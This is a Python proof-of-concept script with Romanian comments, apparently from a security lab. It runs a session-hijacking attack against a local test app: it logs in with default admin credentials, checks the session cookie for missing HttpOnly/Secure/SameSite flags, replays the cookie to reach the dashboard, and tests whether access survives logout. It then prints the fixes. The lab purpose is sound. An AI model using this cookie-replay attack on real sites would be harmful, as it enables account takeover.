"""
ATAC 4.5 — Gestionare nesigura a sesiunilor
=============================================
Demonstreaza doua probleme:
  1. Cookie-ul de sesiune nu are flagurile HttpOnly/Secure/SameSite
     => JavaScript poate citi cookie-ul (risc XSS)
  2. Sesiunea poate fi reutilizata dupa ce a fost "furata"
     => un atacator cu cookie-ul poate accesa contul fara parola

Vulnerabilitate: SESSION_COOKIE_HTTPONLY=False, SECURE=False, SAMESITE=None
Impact: furt de sesiune prin XSS sau interceptare retea
"""

import requests

BASE_URL = "http://127.0.0.1:5000"

print("=" * 60)
print("  ATAC 4.5 — Session Hijacking")
print("=" * 60)

# -------------------------------------------------------
# PASUL 1: Login normal si capturarea cookie-ului
# -------------------------------------------------------
print("\n[1] Login ca utilizator legitim...")

sesiune_victima = requests.Session()
response = sesiune_victima.post(
    f"{BASE_URL}/login",
    data={"email": "admin@authx.com", "password": "admin"},
    allow_redirects=True
)

cookie_session = sesiune_victima.cookies.get("session")

if not cookie_session:
    print("[!] Login esuat. Verifica ca aplicatia ruleaza si contul exista.")
    exit(1)

print(f"    Login reusit!")
print(f"    Cookie furat: session={cookie_session[:40]}...")

# -------------------------------------------------------
# PASUL 2: Analiza flagurilor cookie-ului
# -------------------------------------------------------
print("\n[2] Analiza flagurilor de securitate ale cookie-ului...")

# Refacem login cu allow_redirects=False ca sa vedem Set-Cookie raw
r = requests.post(
    f"{BASE_URL}/login",
    data={"email": "admin@authx.com", "password": "admin"},
    allow_redirects=False
)

set_cookie_header = r.headers.get("Set-Cookie", "")
print(f"    Set-Cookie header: {set_cookie_header}")
print()

flaguri = {
    "HttpOnly": "HttpOnly" in set_cookie_header,
    "Secure":   "Secure"   in set_cookie_header,
    "SameSite": "SameSite" in set_cookie_header,
}

for flag, prezent in flaguri.items():
    status = "prezent" if prezent else "LIPSA ✗ — VULNERABIL"
    print(f"    {flag:<12} : {status}")

# -------------------------------------------------------
# PASUL 3: Reutilizarea cookie-ului furat
# -------------------------------------------------------
print("\n[3] Simulare atac: atacatorul foloseste cookie-ul furat...")

sesiune_atacator = requests.Session()
sesiune_atacator.cookies.set("session", cookie_session)

response_dashboard = sesiune_atacator.get(
    f"{BASE_URL}/dashboard",
    allow_redirects=True
)

if "Dashboard" in response_dashboard.text or "Creeaza primul" in response_dashboard.text:
    print("    ACCES OBTINUT la /dashboard fara username/parola!")
    print("    Atacatorul a preluat sesiunea victimei.")
else:
    print("    Acces refuzat.")

# -------------------------------------------------------
# PASUL 4: Logout + reutilizare (sesiunea nu e invalidata server-side)
# -------------------------------------------------------
print("\n[4] Victima face logout...")
sesiune_victima.get(f"{BASE_URL}/logout")
print("    Logout efectuat.")

print("\n[5] Atacatorul incearca din nou cu acelasi cookie...")
response_dupa_logout = sesiune_atacator.get(
    f"{BASE_URL}/dashboard",
    allow_redirects=True
)

if "Dashboard" in response_dupa_logout.text or "Creeaza primul" in response_dupa_logout.text:
    print("    ACCES INCA VALID dupa logout!")
    print("    Sesiunea NU este invalidata server-side.")
else:
    print("    Acces refuzat dupa logout (sesiunea a fost invalidata).")

print()
print("=" * 60)
print("[!] Concluzie:")
print("[!] 1. Cookie fara HttpOnly => JavaScript poate fura sesiunea")
print("[!] 2. Cookie furat poate fi reutilizat direct")
print("[!] 3. Logout nu invalideaza sesiunea pe server")
print("[!] Fix: HttpOnly=True, Secure=True, SameSite=Lax,")
print("[!]      invalidare server-side la logout")
print("=" * 60)
